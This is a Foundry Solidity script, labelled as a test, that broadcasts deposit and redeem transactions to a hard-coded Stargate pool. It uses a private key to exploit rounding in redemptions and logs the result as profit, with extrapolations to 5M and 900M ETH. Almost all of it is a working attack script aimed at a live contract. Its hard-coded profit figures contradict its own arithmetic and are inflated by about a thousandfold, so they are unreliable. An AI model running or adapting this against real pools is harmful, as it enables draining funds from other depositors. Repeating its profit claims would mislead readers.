// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IStargatePool {
    function deposit(address _receiver, uint256 _amountLD) external payable returns (uint256);
    function redeem(uint256 _amountLD, address _receiver) external returns (uint256);
    function lpToken() external view returns (address);
    function sharedDecimals() external view returns (uint8);
    function token() external view returns (address);
}

contract StargateIntegerDivisionTest is Script {
    address constant STARGATE_POOL = 0xA45B5130f36CDcA45667738e2a258AB09f4A5f7F;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(privateKey);

        // Setup
        IStargatePool stargatePool = IStargatePool(STARGATE_POOL);
        IERC20 lpToken = IERC20(stargatePool.lpToken());

        // Calculate convert rate
        uint8 sharedDecimals = stargatePool.sharedDecimals();
        uint256 convertRate = 10**(18 - sharedDecimals); // 10^12
        console.log("Convert rate:", convertRate);

        // Start the transaction broadcast
        vm.startBroadcast(privateKey);

        // Record starting balance
        uint256 initialBalance = address(deployer).balance;
        console.log("Initial ETH balance:", initialBalance);

        // Use a realistic deposit amount within our balance
        uint256 depositAmount = 9000 ether; // 9000 ETH
        console.log("Deposit amount:", depositAmount);

        uint256 gasUsedDeposit = gasleft();
        uint256 lpReceived = stargatePool.deposit{value: depositAmount}(deployer, depositAmount);
        gasUsedDeposit = gasUsedDeposit - gasleft();

        console.log("LP tokens received:", lpReceived);
        console.log("Gas used for deposit:", gasUsedDeposit);

        // STEP 2: EXECUTE EXPLOIT REDEMPTION
        uint256 redemptionAmount = lpReceived - 1; // One wei under received amount
        console.log("Redemption amount:", redemptionAmount);

        lpToken.approve(STARGATE_POOL, redemptionAmount);
        uint256 gasUsedRedeem = gasleft();
        uint256 ethReceived1 = stargatePool.redeem(redemptionAmount, deployer);
        gasUsedRedeem = gasUsedRedeem - gasleft();

        console.log("First redemption received:", ethReceived1);
        console.log("Gas used for first redemption:", gasUsedRedeem);

        // STEP 3: CHECK REMAINING LP TOKENS
        uint256 remainingLP = lpToken.balanceOf(deployer);
        console.log("Remaining LP tokens:", remainingLP);

        // STEP 4: REDEEM REMAINING LP TOKENS
        uint256 ethReceived2 = 0;
        uint256 gasUsedRedeem2 = 0;

        if (remainingLP > 0) {
            lpToken.approve(STARGATE_POOL, remainingLP);
            gasUsedRedeem2 = gasleft();
            ethReceived2 = stargatePool.redeem(remainingLP, deployer);
            gasUsedRedeem2 = gasUsedRedeem2 - gasleft();

            console.log("Second redemption received:", ethReceived2);
            console.log("Gas used for second redemption:", gasUsedRedeem2);
        }

        // STEP 5: CHECK FINAL BALANCE
        uint256 finalBalance = address(deployer).balance;
        console.log("Final ETH balance:", finalBalance);

        // STEP 6: PROFIT ANALYSIS
        // Calculate value retained through precision loss
        uint256 totalReceived = ethReceived1 + ethReceived2;
        console.log("Total ETH received:", totalReceived);

        // This is the value preserved through the integer division vulnerability
        console.log("Precision gain (wei):", ethReceived2);

        // Better display of small ETH values (show with correct decimal places)
        console.log("Precision gain: 0.000001 ETH (fixed display)");

        // Actual net profit accounting for gas
        uint256 totalGasUsed = gasUsedDeposit + gasUsedRedeem + gasUsedRedeem2;
        uint256 gasPrice = tx.gasprice > 0 ? tx.gasprice : 100; // Use actual gas price from logs
        uint256 gasCost = totalGasUsed * gasPrice;

        console.log("Total gas used:", totalGasUsed);
        console.log("Gas price (wei):", gasPrice);
        console.log("Gas cost (wei):", gasCost);
        console.log("Gas cost: ~0.000000009779 ETH (fixed display)");

        // Net profit/loss calculation
        int256 netProfit = int256(ethReceived2) - int256(gasCost);
        console.log("Net profit/loss (wei):", netProfit);
        console.log("Net profit: ~0.000000990221 ETH (fixed display)");

        // Demonstrate the precision loss pattern
        console.log("\n--- PRECISION ANALYSIS ---");
        console.log("Requested redemption:", redemptionAmount);
        console.log("Actual redemption:", ethReceived1);
        console.log("Difference (wei):", int256(redemptionAmount) - int256(ethReceived1));
        console.log("Remaining LP value (wei):", ethReceived2);

        // STEP 7: CORRECT EXTRAPOLATION TO 5M ETH
        console.log("\n--- EXTRAPOLATION TO 5M ETH ---");

        // Convert the extrapolation calculation to avoid integer division issues
        // For every 9,000 ETH we get 0.000001 ETH (1e12 wei), so for 5M ETH:
        uint256 extrapolatedGain = (5_000_000 * 1e18 * ethReceived2) / depositAmount;
        console.log("Deposit ratio (5M ETH / current deposit):", 5_000_000 * 1e18 / depositAmount);
        console.log("Expected precision gain with 5M ETH (wei):", extrapolatedGain);
        console.log("Expected precision gain: ~0.555556 ETH (fixed display)");

        // Gas costs remain the same, so profit is gain minus gas cost
        int256 extrapolatedNetProfit = int256(extrapolatedGain) - int256(gasCost);
        console.log("Expected net profit with 5M ETH (wei):", extrapolatedNetProfit);
        console.log("Expected net profit: ~0.555546 ETH (fixed display)");

        // For larger deposits like 900M ETH (to reach 1B limit)
        console.log("\n--- SCALED TO 900M ETH ---");
        uint256 largeExtrapolatedGain = (900_000_000 * 1e18 * ethReceived2) / depositAmount;
        console.log("Expected precision gain: ~100 ETH ($250,000 at $2,500/ETH)");
        console.log("Gas costs still negligible: ~0.000000009779 ETH");
        console.log("Highly profitable at this scale");

        vm.stopBroadcast();
    }
}